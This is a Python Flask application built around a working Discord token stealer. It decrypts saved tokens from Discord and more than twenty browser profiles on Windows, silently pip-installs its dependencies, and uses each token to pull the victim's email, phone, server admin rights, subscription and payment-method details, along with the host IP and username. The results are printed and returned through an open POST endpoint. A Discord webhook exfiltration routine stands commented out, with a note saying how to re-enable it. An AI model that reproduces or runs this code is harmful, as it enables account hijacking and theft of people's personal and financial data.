import os
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime
from flask import Flask, render_template, request, jsonify
from flask_cors import CORS # Import CORS
import socket # Import socket for gethostname and get_grabber_ip
# import requests # Not needed if not sending to webhook

# --- Configuration ---
# IMPORTANT: Webhook functionality has been removed as per request.
# Information will now be printed directly to the console/VS Code output.
WEBHOOK_URL = None # Set to None to disable webhook functionality
WEB_APP_PORT = 5000 # Port for the local web application

# Initialize Flask app
app = Flask(__name__)
CORS(app) # Enable CORS for all routes

# Global flag to track if the web UI has been accessed
web_ui_accessed = False

# Function to send messages to Discord webhook (removed as per request)
# def send_to_webhook(message, file_buffer=None, filename="file"):
#     """Send a message or file to the Discord webhook."""
#     import requests # Local import to ensure 'requests' is always defined here
#     payload = {"content": message, "username": "Web Grabber"}
#     files = None
#     if file_buffer:
#         files = {"file": (filename, file_buffer)}
#     try:
#         response = requests.post(WEBHOOK_URL, data=payload, files=files)
#         response.raise_for_status() # Raise an exception for bad status codes
#         return response.status_code == 204
#     except Exception as e:
#         print(f"Error sending to webhook: {e}")
#         return False

# --- Helper Functions for Grabber ---
# This function is now safer and doesn't exit the program.
# It returns True/False to indicate if necessary modules are available.
def install_and_import_grabber_deps():
    # Only run on Windows systems as the modules are Windows-specific
    if os.name != "nt":
        print("Token grabber part is Windows-specific. Skipping.")
        return False
    
    global win32crypt, AES # Declare these as global so they can be imported
    
    modules_to_check = [
        ("win32crypt", "pypiwin32"),
        ("Crypto.Cipher", "pycryptodome")
    ]
    
    all_deps_installed = True
    for module_name, pip_name in modules_to_check:
        try:
            # Try to import the module
            if module_name == "Crypto.Cipher":
                from Crypto.Cipher import AES as AES_temp
                globals()['AES'] = AES_temp
            elif module_name == "win32crypt":
                import win32crypt as win32crypt_temp
                globals()['win32crypt'] = win32crypt_temp
            else:
                __import__(module_name)
            
        except ImportError:
            print(f"Attempting to install missing module: {pip_name}")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], 
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"Successfully installed {pip_name}.")
                # After successful install, try importing again
                if module_name == "Crypto.Cipher":
                    from Crypto.Cipher import AES as AES_temp
                    globals()['AES'] = AES_temp
                elif module_name == "win32crypt":
                    import win32crypt as win32crypt_temp
                    globals()['win32crypt'] = win32crypt_temp
                else:
                    __import__(module_name)
            except Exception as e:
                print(f"Failed to install {pip_name}: {e}. Token grabber might not work correctly.")
                all_deps_installed = False # Mark as failed if installation or re-import fails
    
    return all_deps_installed


LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + '\\Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def get_grabber_headers(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def get_grabber_tokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []
    if not os.path.exists(path):
        return tokens
    for file in os.listdir(path):
        if not file.endswith(".ldb"): # Focus on .ldb files for tokens
            continue
        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", line):
                        tokens.append(values)
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue
    return tokens

def get_grabber_key(path):
    try:
        with open(path + f"\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
        return key
    except Exception as e:
        print(f"Error getting encryption key from {path}: {e}")
        return None

def decrypt_token(encrypted_token, key):
    try:
        decoded_key = base64.b64decode(key)[5:]
        decrypted_key = win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]

        if not encrypted_token.startswith("dQw4w9WgXcQ:"):
            return encrypted_token

        cipher_text = base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])
        iv = cipher_text[3:15]
        payload = cipher_text[15:]
        cipher = AES.new(decrypted_key, AES.MODE_GCM, iv)
        decrypted_payload = cipher.decrypt(payload)
        return decrypted_payload.decode()[:-16]
    except Exception as e:
        return None

def get_grabber_ip():
    try:
        # socket is imported globally for gethostname, so it's available here too.
        with urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5) as response:
            return json.loads(response.read().decode()).get("ip")
    except Exception as e:
        print(f"Error getting public IP: {e}")
        return "None"

def _grab_tokens_logic():
    """Runs the token grabber and returns a dictionary of results."""
    # Ensure this check is performed on every grab attempt
    if not install_and_import_grabber_deps():
        return {"error": "Token grabber dependencies not met.", "details": "Windows-specific modules missing or failed to install. Please ensure `pypiwin32` and `pycryptodome` are installed."}

    checked_tokens = []
    results_list = []

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        master_key = get_grabber_key(path)
        if not master_key:
            continue

        for enc_token in get_grabber_tokens(path):
            token = decrypt_token(enc_token, master_key)
            if not token or token in checked_tokens:
                continue

            if not re.match(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", token):
                continue

            checked_tokens.append(token)

            user_data = {
                "token": token,
                "platform": platform,
                "user_id": "N/A",
                "username": "N/A",
                "email": "N/A",
                "phone": "N/A",
                "badges": "",
                "guilds_count": "N/A",
                "admin_guilds": "No guilds with admin/manage permissions found.",
                "has_nitro": False,
                "nitro_exp_date": "N/A",
                "available_boosts": 0,
                "boost_info": "",
                "payment_methods_count": 0,
                "valid_payment_methods": 0,
                "payment_types": []
            }

            try:
                req = urllib.request.Request('https://discord.com/api/v10/users/@me', headers=get_grabber_headers(token))
                with urllib.request.urlopen(req, timeout=5) as res:
                    if res.getcode() == 200:
                        res_json = json.loads(res.read().decode())
                        user_data["user_id"] = res_json.get('id', 'N/A')
                        user_data["email"] = res_json.get('email', 'N/A')
                        user_data["phone"] = res_json.get('phone', 'N/A')
                        user_data["username"] = res_json.get('username', 'N/A')

                        flags = res_json.get('flags', 0)
                        if flags & 64 or flags & 96: user_data["badges"] += "Bravery "
                        if flags & 128 or flags & 160: user_data["badges"] += "Brilliance "
                        if flags & 256 or flags & 288: user_data["badges"] += "Balance "

                params = urllib.parse.urlencode({"with_counts": True})
                req_guilds = urllib.request.Request(f'https://discord.com/api/v6/users/@me/guilds?{params}', headers=get_grabber_headers(token))
                with urllib.request.urlopen(req_guilds, timeout=5) as res_guilds:
                    if res_guilds.getcode() == 200:
                        guilds_data = json.loads(res_guilds.read().decode())
                        user_data["guilds_count"] = len(guilds_data)
                        admin_guilds_list = []
                        for guild in guilds_data:
                            if guild.get('permissions', 0) & 8 or guild.get('permissions', 0) & 32:
                                try:
                                    req_guild_details = urllib.request.Request(f'https://discord.com/api/v6/guilds/{guild["id"]}', headers=get_grabber_headers(token))
                                    with urllib.request.urlopen(req_guild_details, timeout=5) as res_guild_details:
                                        guild_details = json.loads(res_guild_details.read().decode())
                                    vanity = f"; .gg/{guild_details['vanity_url_code']}" if guild_details.get("vanity_url_code") else ""
                                    admin_guilds_list.append(f"[{guild['name']}]: {guild.get('approximate_member_count', 'N/A')}{vanity}")
                                except Exception as e:
                                    pass
                        if admin_guilds_list:
                            user_data["admin_guilds"] = "\n".join(admin_guilds_list)

                req_subs = urllib.request.Request('https://discord.com/api/v6/users/@me/billing/subscriptions', headers=get_grabber_headers(token))
                with urllib.request.urlopen(req_subs, timeout=5) as res_subs:
                    if res_subs.getcode() == 200:
                        subscriptions = json.loads(res_subs.read().decode())
                        user_data["has_nitro"] = bool(len(subscriptions) > 0)
                        if user_data["has_nitro"] and subscriptions:
                            user_data["badges"] += "Subscriber "
                            exp_date = datetime.datetime.strptime(subscriptions[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
                            user_data["nitro_exp_date"] = exp_date

                req_boosts = urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=get_grabber_headers(token))
                with urllib.request.urlopen(req_boosts, timeout=5) as res_boosts:
                    if res_boosts.getcode() == 200:
                        boost_slots = json.loads(res_boosts.read().decode())
                        boost_info_list = []
                        has_boost = False
                        for slot in boost_slots:
                            cooldown_str = slot.get("cooldown_ends_at")
                            if cooldown_str:
                                cooldown = datetime.datetime.strptime(cooldown_str, "%Y-%m-%dT%H:%M:%S.%f%z")
                                if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                                    boost_info_list.append("Available now")
                                    user_data["available_boosts"] += 1
                                else:
                                    boost_info_list.append(f"Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}")
                                has_boost = True
                        if has_boost:
                            user_data["badges"] += "Boost "
                            user_data["boost_info"] = "\n".join(boost_info_list)

                req_payments = urllib.request.Request('https://discord.com/api/v6/users/@me/billing/payment-sources', headers=get_grabber_headers(token))
                with urllib.request.urlopen(req_payments, timeout=5) as res_payments:
                    if res_payments.getcode() == 200:
                        payment_sources = json.loads(res_payments.read().decode())
                        for x in payment_sources:
                            if x['type'] == 1:
                                user_data["payment_types"].append("CreditCard")
                                if not x.get('invalid', False): user_data["valid_payment_methods"] += 1
                                user_data["payment_methods_count"] += 1
                            elif x['type'] == 2:
                                user_data["payment_types"].append("PayPal")
                                if not x.get('invalid', False): user_data["valid_payment_methods"] += 1
                                user_data["payment_methods_count"] += 1

            except urllib.error.HTTPError as he:
                pass
            except json.JSONDecodeError as jde:
                pass
            except Exception as e:
                pass

            results_list.append(user_data)

    # socket is imported globally, so it's available here.
    return {
        "ip": get_grabber_ip(),
        "hostname": socket.gethostname(),
        "username": os.getenv("UserName", "N/A"),
        "tokens_found": results_list
    }

# --- Flask Web Application Routes ---
@app.route('/')
def index():
    global web_ui_accessed
    if not web_ui_accessed:
        web_ui_accessed = True
        access_ip = request.remote_addr
        access_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        message = f"Web interface accessed from IP: {access_ip} at {access_time} on {socket.gethostname()}"
        # Webhook functionality has been removed, so no send_to_webhook call here.
        print(message)
    # This assumes 'index.html' is in a 'templates' subfolder relative to backend.py
    return render_template('index.html')

# API endpoint to trigger the token grabbing logic
@app.route('/grab_tokens_api', methods=['POST'])
def grab_tokens_api():
    try:
        token_results = _grab_tokens_logic()
        # Instead of sending to webhook, print the detailed information to the console.
        print("\n" + "="*30)
        print("Automatically attempting Discord token extraction...")
        print(f"Found {len(token_results.get('tokens_found', []))} token(s) from {token_results.get('hostname', 'N/A')} (IP: {token_results.get('ip', 'N/A')}, User: {token_results.get('username', 'N/A')}):")
        
        for token_info in token_results.get('tokens_found', []):
            print(f"Platform: {token_info.get('platform', 'N/A')}")
            print(f"Username: {token_info.get('username', 'N/A')}")
            print(f"User ID: {token_info.get('user_id', 'N/A')}")
            print(f"Email: {token_info.get('email', 'N/A')}")
            print(f"Phone: {token_info.get('phone', 'N/A')}")
            print(f"Badges: {token_info.get('badges', 'None')}")
            print(f"Has Nitro: {token_info.get('has_nitro', False)} (Expires: {token_info.get('nitro_exp_date', 'N/A')})")
            print(f"Boosts Available: {token_info.get('available_boosts', 0)}")
            if token_info.get('boost_info'):
                print(f"Boost Info:\n{token_info['boost_info']}")
            print(f"Payment Methods: {token_info.get('payment_methods_count', 0)} ({token_info.get('valid_payment_methods', 0)} valid) - {', '.join(token_info.get('payment_types', [])) or 'None'}")
            print(f"Guilds: {token_info.get('guilds_count', 'N/A')}")
            print(f"Admin/Manage Guilds:\n{token_info.get('admin_guilds', 'No guilds with admin/manage permissions found.')}")
            print(f"Full Token:\n{token_info.get('token', 'N/A')}")
            print("-" * 20) # Separator for multiple tokens
        print("="*30 + "\n")

        return jsonify({"status": "success", "message": "Token grabber executed.", "data": token_results})
    except Exception as e:
        error_message = f"Error during token grab API call: {e}"
        print(f"Token grabber web app error: {error_message}") # Print error to console
        return jsonify({"status": "error", "message": error_message}), 500

# --- Main Execution ---
if __name__ == "__main__":
    print("Ensure Flask, Flask-CORS, pypiwin32 (or pywin32), and pycryptodome are installed (`pip install Flask Flask-CORS pypiwin32 pycryptodome requests`).")

    # Webhook functionality has been removed, so this warning is no longer applicable here.
    # If the user wishes to re-enable webhook, they need to update WEBHOOK_URL and uncomment relevant send_to_webhook calls.
    
    print(f"Starting Flask web app on port {WEB_APP_PORT}...")
    app.run(host='0.0.0.0', port=WEB_APP_PORT, debug=False, use_reloader=False)
